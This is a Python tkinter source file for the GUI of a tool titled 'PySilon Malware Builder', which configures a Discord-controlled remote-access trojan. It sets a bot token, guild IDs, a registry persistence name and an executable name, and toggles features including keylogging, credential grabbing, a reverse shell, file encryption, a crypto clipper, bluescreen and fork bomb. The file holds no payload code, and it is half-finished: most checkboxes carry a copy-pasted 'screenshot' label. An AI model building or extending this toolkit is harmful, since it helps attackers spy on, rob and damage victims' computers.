import tkinter as tk
from tkinter import ttk
import random
import os
import json
import tkinter.font as tkFont
from PIL import Image, ImageTk, ImageFont

class Builder:
    def __init__(self, master):
        self.master = master
        self.master.title('PySilon Malware Builder')

        self.create_navigation()

        self.canvas = tk.Canvas(self.master, border=0, highlightthickness=0)
        self.canvas.place(x=0,y=40,width=700,height=460)

        self.configuration = {
            'token': '',
            'guild_ids': '',
            'registry_name': '',
            'directory_name': '',
            'executable_name': '',
            'icon_path': '',
            'functionalities': {
                'keylogr': True,
                'scrnsht': True,
                'regstry': True,
                'f_downl': True,
                'f_upldg': True,
                'f_rmval': True,
                'f_explr': True,
                'f_encrp': True,
                'grabber': True,
                'mc_live': True,
                'mc_recc': True,
                'process': True,
                'rev_shl': True,
                'webcam_': True,
                'scrnrec': True,
                'inputbl': True,
                'bluesod': True,
                'crclipr': True,
                'forkbmb': True,
                'messger': True,
                'txtspee': True,
                'audctrl': True,
                'monctrl': True,
                'webbloc': True,
                'jmpscar': True,
                'keystrk': True,
                'scrnman': True
            }
        }

        self.general_settings()

    def new_background(self, demand=None):
        self.canvas.delete('all')
        selected_background = random.randint(1, len(os.listdir("resources/assets/builder_backgrounds")))
        if demand != None: selected_background = demand
        self.image = ImageTk.PhotoImage(Image.open(f'resources/assets/builder_backgrounds/{selected_background}.jpg'))
        self.canvas.create_image(0, 0, image=self.image, anchor=tk.NW)

    def create_navigation(self):
        self.button_frame = tk.Frame(self.master)
        self.button_frame.place(x=0, y=0, width=700, height=40)

        self.general_settings_button = tk.Button(
            self.button_frame,
            text='General Settings',
            font=tkFont.Font(family='Consolas', size=10),
            disabledforeground='white',
            command=self.general_settings
            )
        self.general_settings_button.place(x=0, y=0, width=135, height=40)

        self.functionality_settings_button = tk.Button(
            self.button_frame,
            text='Functionality Settings',
            font=tkFont.Font(family='Consolas', size=10),
            disabledforeground='white',
            command=self.functionality_settings_click
            )
        self.functionality_settings_button.place(x=135, y=0, width=175, height=40)

        self.compiling_settings_button = tk.Button(
            self.button_frame,
            text='Compiling Settings',
            font=tkFont.Font(family='Consolas', size=10),
            disabledforeground='white',
            command=self.compiling_settings_click
            )
        self.compiling_settings_button.place(x=310, y=0, width=145, height=40)

        self.pysilon_logo = tk.Label(
            self.button_frame,
            text='PySilon',
            font=tkFont.Font(family='Elephant', size=24)
            )
        self.pysilon_logo.place(x=549, y=-7)

        self.pysilon_sublogo = tk.Label(
            self.button_frame,
            text='M  A  L  W  A  R  E',
            font=tkFont.Font(family='Elephant', size=5),
            fg='red'
            )
        self.pysilon_sublogo.place(x=590, y=27, width=70)

        vertical_separator = ttk.Separator(self.button_frame, orient='vertical')
        vertical_separator.place(x=455, y=0, height=40, width=1)

        horizontal_separator = ttk.Separator(self.button_frame, orient='horizontal')
        horizontal_separator.place(x=455, y=39, height=1, width=245)
        
    def draw_initial_content(self):
        self.canvas.create_text(200, 150, text='Initial Content', font=('Helvetica', 16), fill='black')

    def save_configuration(self, temporary=True):
        try:
            self.configuration['token'] = self.token_entry.get()
            self.configuration['guild_ids'] = self.guildids_entry.get()
            self.configuration['registry_name'] = self.registry_entry.get()
            self.configuration['directory_name'] = self.directory_entry.get()
            self.configuration['executable_name'] = self.executable_entry.get()
        except: pass
        try:
            print(self.cbvar_keylogr.get())
        except: print('eror')

        with open('configuration.json' if not temporary else 'resources/assets/configuration.tmp', 'w', encoding='utf-8') as configuration_file:
            configuration_file.write(json.dumps(self.configuration))

    def load_configuration(self, temporary):
        with open('configuration.json' if not temporary else 'resources/assets/configuration.tmp', 'r', encoding='utf-8') as configuration_file:
            self.configuration = json.loads(''.join(configuration_file.readlines()))
        

    def general_settings(self):
        self.general_settings_button['state'] = tk.DISABLED
        self.general_settings_button['relief'] = 'flat'
        self.functionality_settings_button ['state'] = tk.NORMAL
        self.functionality_settings_button['relief'] = 'groove'
        self.compiling_settings_button['state'] = tk.NORMAL
        self.compiling_settings_button['relief'] = 'groove'
        self.save_configuration(True)
        self.new_background()
        self.load_configuration(True)

        self.canvas.create_text(220, 80, text='BOT Token:', fill='white', font=('Consolas', 16), anchor=tk.E)
        self.token_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33)
        self.token_entry.insert(0, self.configuration['token'])
        self.canvas.create_window(225, 80, window=self.token_entry, anchor='w')
 
        self.canvas.create_text(220, 110, text='Guild IDs:', fill='white', font=('Consolas', 16), anchor=tk.E)
        self.guildids_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33)
        self.guildids_entry.insert(0, self.configuration['guild_ids'])
        self.canvas.create_window(225, 110, window=self.guildids_entry, anchor='w')

        self.canvas.create_text(220, 140, text='Registry Name:', fill='white', font=('Consolas', 16), anchor=tk.E)
        self.registry_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33)
        self.registry_entry.insert(0, self.configuration['registry_name'])
        self.canvas.create_window(225, 140, window=self.registry_entry, anchor='w')

        self.canvas.create_text(220, 170, text='Directory Name:', fill='white', font=('Consolas', 16), anchor=tk.E)
        self.directory_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33)
        self.directory_entry.insert(0, self.configuration['directory_name'])
        self.canvas.create_window(225, 170, window=self.directory_entry, anchor='w')

        self.canvas.create_text(220, 200, text='Executable Name:', fill='white', font=('Consolas', 16), anchor=tk.E)
        self.executable_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33)
        self.executable_entry.insert(0, self.configuration['executable_name'])
        self.canvas.create_window(225, 200, window=self.executable_entry, anchor='w')





    def functionality_settings_click(self):
        self.general_settings_button['state'] = tk.NORMAL
        self.general_settings_button['relief'] = 'groove'
        self.functionality_settings_button ['state'] = tk.DISABLED
        self.functionality_settings_button['relief'] = 'flat'
        self.compiling_settings_button['state'] = tk.NORMAL
        self.compiling_settings_button['relief'] = 'groove'
        self.save_configuration(True)
        self.new_background(1)
        self.transparent_background = tk.PhotoImage(width=1, height=1)

        x_start, y_start, y_delta = 20, 200, 35

        self.cbvar_keylogr = tk.BooleanVar(value=True)
        self.cb_keylogr = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='keylogger',
            font=('Consolas', 12),
            variable=self.cbvar_keylogr,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.canvas.create_window(x_start, y_delta*1, window=self.cb_keylogr, anchor='w')

        self.cbvar_scrnsht = tk.BooleanVar(value=True)
        self.cb_scrnsht = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='screenshot',
            font=('Consolas', 12),
            variable=self.cbvar_scrnsht,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.canvas.create_window(x_start, y_delta*2, window=self.cb_scrnsht, anchor='w')

        self.cbvar_fdownl = tk.BooleanVar(value=True)
        self.cb_fdownl = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='screenshot',
            font=('Consolas', 12),
            variable=self.cbvar_fdownl,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.canvas.create_window(x_start, y_delta*3, window=self.cb_fdownl, anchor='w')

        self.cbvar_fupldg = tk.BooleanVar(value=True)
        self.cb_fupldg = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='screenshot',
            font=('Consolas', 12),
            variable=self.cbvar_fupldg,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.canvas.create_window(x_start, y_delta*4, window=self.cb_fupldg, anchor='w')

        self.cbvar_frmval = tk.BooleanVar(value=True)
        self.cb_frmval = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='screenshot',
            font=('Consolas', 12),
            variable=self.cbvar_frmval,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.canvas.create_window(x_start, y_delta*5, window=self.cb_frmval, anchor='w')

        self.cbvar_fexplr = tk.BooleanVar(value=True)
        self.cb_fexplr = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='screenshot',
            font=('Consolas', 12),
            variable=self.cbvar_fexplr,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.canvas.create_window(x_start, y_delta*6, window=self.cb_fexplr, anchor='w')

        self.cbvar_fencrp = tk.BooleanVar(value=True)
        self.cb_fencrp = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='screenshot',
            font=('Consolas', 12),
            variable=self.cbvar_fencrp,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.canvas.create_window(x_start, y_delta*7, window=self.cb_fencrp, anchor='w')

        self.cbvar_grabber = tk.BooleanVar(value=True)
        self.cb_grabber = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='screenshot',
            font=('Consolas', 12),
            variable=self.cbvar_grabber,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.canvas.create_window(x_start, y_delta*8, window=self.cb_grabber, anchor='w')

        self.cbvar_mclive = tk.BooleanVar(value=True)
        self.cb_mclive = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='screenshot',
            font=('Consolas', 12),
            variable=self.cbvar_mclive,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.canvas.create_window(x_start, y_delta*9, window=self.cb_mclive, anchor='w')

        self.cbvar_mcrecc = tk.BooleanVar(value=True)
        self.cb_mcrecc = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='screenshot',
            font=('Consolas', 12),
            variable=self.cbvar_mcrecc,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.canvas.create_window(x_start, y_delta*10, window=self.cb_mcrecc, anchor='w')

        self.cbvar_process = tk.BooleanVar(value=True)
        self.cb_process = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='screenshot',
            font=('Consolas', 12),
            variable=self.cbvar_process,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.canvas.create_window(x_start, y_delta*11, window=self.cb_process, anchor='w')

        self.cbvar_revshl = tk.BooleanVar(value=True)
        self.cb_revshl = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='screenshot',
            font=('Consolas', 12),
            variable=self.cbvar_revshl,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.canvas.create_window(x_start, y_delta*12, window=self.cb_revshl, anchor='w')




    def compiling_settings_click(self):
        self.general_settings_button['state'] = tk.NORMAL
        self.general_settings_button['relief'] = 'groove'
        self.functionality_settings_button ['state'] = tk.NORMAL
        self.functionality_settings_button['relief'] = 'groove'
        self.compiling_settings_button['state'] = tk.DISABLED
        self.compiling_settings_button['relief'] = 'flat'
        self.new_background()
        self.canvas.create_text(200, 150, text='Content for Button 3', font=('Helvetica', 16), fill='red')

def main():
    root = tk.Tk()
    Builder(root)
    root.geometry('700x500')
    #root.wm_attributes('-transparentcolor', '#ab23ff')
    root.tk_setPalette(background='#0A0A10', foreground='white', activeBackground='#0A0A10', activeForeground='white')
    root.mainloop()

if __name__ == '__main__':
    main()
